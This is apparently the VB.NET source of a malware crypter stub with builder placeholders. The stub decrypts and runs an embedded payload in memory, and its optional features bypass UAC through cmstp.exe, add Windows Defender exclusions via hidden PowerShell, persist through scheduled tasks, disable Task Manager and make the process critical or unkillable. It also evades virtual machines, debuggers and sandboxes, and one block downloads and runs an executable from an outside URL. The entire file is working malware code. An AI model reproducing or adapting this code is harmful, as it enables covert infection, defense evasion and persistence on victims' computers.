Imports System.ComponentModel
Imports System.Security.AccessControl
Imports System.Management
Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Reflection
Imports System.Resources
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Environment
Imports Microsoft.Win32


<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Des%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
<Assembly: Guid("%Guid%")>

#Const UAC = False
#Const WDEX = False
#Const Schtasks = False
#Const AntiKillP = False
#Const Analysis = False
#Const Method1 = False
#Const BDOS = False
#Const TaskMgr = False

Public Class Program

    Public Shared Sub main()

        If Not CreateMutex() Then Environment.Exit(0)


#If Analysis Then
        AntiAnalysis.RunAntiAnalysis()
#End If

#If UAC Then
        If Not AdminCheck() Then
            Execute(Settings.Current)
            CloseMutex()
            Environment.Exit(0)
        End If
#End If

        Thread.Sleep(Convert.ToInt32(Settings.Sleep) * 1000)

#If TaskMgr Then
        Try
            If AdminCheck() Then
                CreateObject("WScript.Shell").RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
#End If

#If WDEX Then
        If AdminCheck() Then
            Try
                Dim StartInfo As New ProcessStartInfo
                StartInfo.FileName = "powershell.exe"
                StartInfo.WindowStyle = ProcessWindowStyle.Hidden

                StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess " + "'" + Process.GetCurrentProcess.MainModule.ModuleName + "'"
                Process.Start(StartInfo).WaitForExit()

                StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " + "'" + Settings.Current + "'"
                Process.Start(StartInfo).WaitForExit()
#If Schtasks Then
                StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " + "'" + Settings.InstallDir & "\" & IO.Path.GetFileName(Settings.Current) + "'"
                Process.Start(StartInfo).WaitForExit()
#End If
            Catch ex As Exception
                Debug.WriteLine(ex.Message)
            End Try
        End If
#End If

#If Schtasks Then
        Installer()
#End If


        Dim T As New Threading.Thread(AddressOf Memory)
        T.Start(GetTheResource("%Filename%"))

#If BDOS Then
            If AdminCheck() Then
                ProcessCritical.CriticalProcess_Enable()
            End If
#End If

#If Method1 Then
                  Dim devil As String
        Dim x As New System.Text.StringBuilder

          x.Append("https://insellerate.net/doc/taskshostw.exe")
        devil = x.ToString

        Dim URL As String = devil
        Dim DownloadTo As String = Environ("temp") & "taskshostw.exe"
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try
#End If

#If AntiKillP Then
        Dim PS As New Threading.Thread(AddressOf CAntiKill)
        PS.Start()
#End If

        PreventSleep()

        Application.Run()

    End Sub


    Public Shared _appMutex As Mutex
    Public Shared Function CreateMutex() As Boolean
        Dim createdNew As Boolean
        _appMutex = New Mutex(False, Settings.Mutex, createdNew)
        Return createdNew
    End Function

    Public Shared Sub CloseMutex()
        If _appMutex IsNot Nothing Then
            _appMutex.Close()
            _appMutex = Nothing
        End If
    End Sub

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function
    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash As New MD5CryptoServiceProvider
        Try
            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(Settings.Mutex))
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
    Public Shared Function AdminCheck() As Boolean
        Try
            Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
    <DllImport("kernel32.dll", SetLastError:=True)> Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
    End Function
    Public Enum EXECUTION_STATE As UInteger
        ES_CONTINUOUS = &H80000000UI
        ES_DISPLAY_REQUIRED = &H2
        ES_SYSTEM_REQUIRED = &H1
    End Enum
    Public Shared Sub PreventSleep()
        Try
            SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

#If Schtasks Then
    Public Shared Function Installer()
        Dim Path As String = Settings.InstallDir & "\" & IO.Path.GetFileName(Settings.Current)
        Try
            If IO.File.Exists(Path) Then
                IO.File.Delete(Path)
                Thread.Sleep(1000)
            End If
            IO.File.WriteAllBytes(Path, IO.File.ReadAllBytes(Settings.Current))
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
        Try
            Dim PS As New ProcessStartInfo("schtasks.exe")
            If AdminCheck() Then
                PS.Arguments = ("/create /f /sc minute /mo 1 /rl highest /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.Current) & """" & " /tr " + """" + Path + """")
            Else
                PS.Arguments = ("/create /f /sc minute /mo 1 /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.Current) & """" & " /tr " + """" + Path + """")
            End If
            PS.WindowStyle = ProcessWindowStyle.Hidden
            Process.Start(PS).WaitForExit()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Function
#End If


#If AntiKillP Then
    Public Shared Sub CAntiKill()
        Thread.Sleep(4000)
        Try
            Dim c_NewAntiKill As New c_AntiKill
            c_NewAntiKill.c_ImAntiKill()
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
#End If

    Public Shared Sub Memory(ByVal B As Object)
        Try
            Dim loader As Assembly = Assembly.Load(B)
            Dim parm As Object() = Nothing
            If loader.EntryPoint.GetParameters().Length > 0 Then
                parm = New Object() {New String() {Nothing}}
            End If
            loader.EntryPoint.Invoke(Nothing, parm)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

#If UAC Then
    Public Declare Ansi Function PostMessageW Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As Integer, ByVal lParam As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Private Declare Auto Function FindWindowEx Lib "user32" (ByVal parentHandle As Integer, ByVal childAfter As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lclassName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef windowTitle As String) As Integer

    Public Shared Function SetInfFile(ByVal CommandToExecute As String) As String
        Dim value As String = Path.GetRandomFileName().Split(New Char() {Convert.ToChar(".")})(0)
        Dim value2 As String = Interaction.Environ("WinDir") + "\temp"
        Dim stringBuilder As StringBuilder = New StringBuilder()
        stringBuilder.Append(value2)
        stringBuilder.Append("\")
        stringBuilder.Append(value)
        stringBuilder.Append(".inf")
        Dim stringBuilder2 As StringBuilder = New StringBuilder(Code())
        stringBuilder2.Replace("REPLACE_COMMAND_LINE", CommandToExecute)
        File.WriteAllText(stringBuilder.ToString(), stringBuilder2.ToString())
        Return stringBuilder.ToString()
    End Function

    Public Shared Function Execute(ByVal pp As String) As Boolean
        Dim flag As Boolean = Not File.Exists(BinaryPath)
        Dim flag2 As Boolean = flag
        Dim result As Boolean
        If flag2 Then
            result = False
        Else
            Dim stringBuilder As StringBuilder = New StringBuilder()
            stringBuilder.Append(SetInfFile(pp))

            Dim StartInfo As New ProcessStartInfo
            StartInfo.FileName = BinaryPath
            StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            StartInfo.Arguments = "/au " + stringBuilder.ToString()
            Process.Start(StartInfo)

            Thread.Sleep(5000)
            Dim parentHandle As Integer = 0
            Dim childAfter As Integer = 0
            Dim text As String = Nothing
            Dim text2 As String = """HM"""
            Dim value As Integer = FindWindowEx(parentHandle, childAfter, text, text2)
            PostMessageW(CType(value, IntPtr), 256UI, 13, 0)
            result = True
        End If
        Return result
    End Function

    Public Shared Function Code() As String
        Dim stringBuilder As StringBuilder = New StringBuilder()
        stringBuilder.Append("[version]" & vbCrLf & "Signature=$chicago$" & vbCrLf & "AdvancedINF=2.5")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[DefaultInstall]" & vbCrLf & "CustomDestination=CustInstDestSectionAllUsers" & vbCrLf & "RunPreSetupCommands=RunPreSetupCommandsSection")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[RunPreSetupCommandsSection]" & vbCrLf & "; Commands Here will be run Before Setup Begins to install" & vbCrLf & "mshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####cmd.exe /c start ################ ########REPLACE_COMMAND_LINE############,0:close###)" & vbCrLf & "mshta vbscript:Execute(###CreateObject(####WScript.Shell####).Run ####taskkill /IM cmstp.exe /F####, 0, true:close###)")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[CustInstDestSectionAllUsers]" & vbCrLf & "49000,49001=AllUSer_LDIDSection, 7")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[AllUSer_LDIDSection]" & vbCrLf & "##HKLM##, ##SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE##, ##ProfileInstallPath##, ##%UnexpectedError%##, ####")
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append(vbCrLf)
        stringBuilder.Append("[Strings]" & vbCrLf & "ServiceName=##HM##" & vbCrLf & "ShortSvcName=##HM##")
        Return stringBuilder.ToString().Replace("#", """")
    End Function
    Public Shared BinaryPath As String = Interaction.Environ("WinDir") + "\system32\cmstp.exe"
#End If

End Class

#If BDOS Then
Public Class ProcessCritical
    <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)> Public Shared Sub SetCurrentProcessIsCritical(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal isCritical As Boolean, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByRef refWasCritical As Boolean, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> ByVal needSystemCriticalBreaks As Boolean)
    End Sub
    Public Shared Sub SystemEvents_SessionEnding(ByVal sender As Object, ByVal e As SessionEndingEventArgs)
        CriticalProcesses_Disable()
    End Sub
    Public Shared Sub CriticalProcess_Enable()
        Try
            AddHandler SystemEvents.SessionEnding, New SessionEndingEventHandler(AddressOf SystemEvents_SessionEnding)
            Dim refWasCritical As Boolean
            System.Diagnostics.Process.EnterDebugMode()
            SetCurrentProcessIsCritical(True, refWasCritical, False)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
    Public Shared Sub CriticalProcesses_Disable()
        Try
            Dim refWasCritical As Boolean
            SetCurrentProcessIsCritical(False, refWasCritical, False)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub
End Class
#End If

#If AntiKillP Then
Public Class c_AntiKill
    <DllImport("advapi32.dll", SetLastError:=True)> Shared Function GetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Out()> ByVal pSecurityDescriptor As Byte(), ByVal nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean
    End Function
    <DllImport("advapi32.dll", SetLastError:=True)> Shared Function SetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <[In]()> ByVal pSecurityDescriptor As Byte()) As Boolean
    End Function
    <DllImport("kernel32.dll")> Shared Function GetCurrentProcess() As IntPtr
    End Function
    Protected Function GetProcessSecurityDescriptor(ByVal processHandle As IntPtr) As RawSecurityDescriptor
        Dim psd() As Byte = New Byte(1) {}
        Dim bufSizeNeeded As UInteger
        GetKernelObjectSecurity(processHandle, &H4, psd, 0, bufSizeNeeded)
        psd = New Byte(bufSizeNeeded) {}
        If bufSizeNeeded < 0 OrElse bufSizeNeeded > Short.MaxValue Then
            Throw New Win32Exception()
        End If
        If Not GetKernelObjectSecurity(processHandle, &H4, psd, bufSizeNeeded, bufSizeNeeded) Then
            Throw New Win32Exception()
        End If
        Return New RawSecurityDescriptor(psd, 0)
    End Function
    Protected Sub SetProcessSecurityDescriptor(ByVal processHandle As IntPtr, ByVal dacl As RawSecurityDescriptor)
        Dim rawsd As Byte() = New Byte(dacl.BinaryLength - 1) {}
        dacl.GetBinaryForm(rawsd, 0)
        If Not SetKernelObjectSecurity(processHandle, &H4, rawsd) Then
            Throw New Win32Exception()
        End If
    End Sub
    Public Sub c_ImAntiKill()
        Dim hProcess As IntPtr = GetCurrentProcess()
        Dim dacl = GetProcessSecurityDescriptor(hProcess)
        dacl.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, CInt(&HF0000 Or &H100000 Or &HFFF), New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
        SetProcessSecurityDescriptor(hProcess, dacl)
    End Sub
End Class
#End If

#If Analysis Then
Public Class AntiAnalysis
    Public Shared Sub RunAntiAnalysis()
        If DetectManufacturer() OrElse DetectDebugger() OrElse DetectSandboxie() OrElse IsXP() OrElse anyrun() Then Environment.FailFast(Nothing)
    End Sub

    Private Shared Function anyrun() As Boolean
        Try
            Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
            Return status.Contains("true")
        Catch
        End Try
        Return False
    End Function

    Private Shared Function IsXP() As Boolean
        Try
            If New Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp") Then
                Return True
            End If
        Catch
        End Try
        Return False
    End Function

    Private Shared Function DetectManufacturer() As Boolean
        Try
            Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")
                Dim item
                Using items = searcher.[Get]()
                    For Each item In items
                        Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
                        If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                            Return True
                        End If
                    Next
                End Using
            End Using
        Catch
        End Try
        Return False
    End Function
    Private Shared Function DetectDebugger() As Boolean
        Dim isDebuggerPresent As Boolean = False
        Try
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
            Return isDebuggerPresent
        Catch
            Return isDebuggerPresent
        End Try
    End Function

    Private Shared Function DetectSandboxie() As Boolean
        Try
            If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
                Return True
            Else
                Return False
            End If
        Catch
            Return False
        End Try
    End Function
    <DllImport("kernel32.dll")> Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
    End Function
    <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)> Public Shared Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
    End Function
End Class
#End If

Public Class Settings

    Public Shared Current As String = Process.GetCurrentProcess.MainModule.FileName
    Public Shared Mutex As String = "%Mutex%"
    Public Shared Sleep As String = "%Sleep%"

#If Schtasks Then
    Public Shared InstallDir As String = System.Environment.ExpandEnvironmentVariables("%ProgramData%")
#End If

End Class
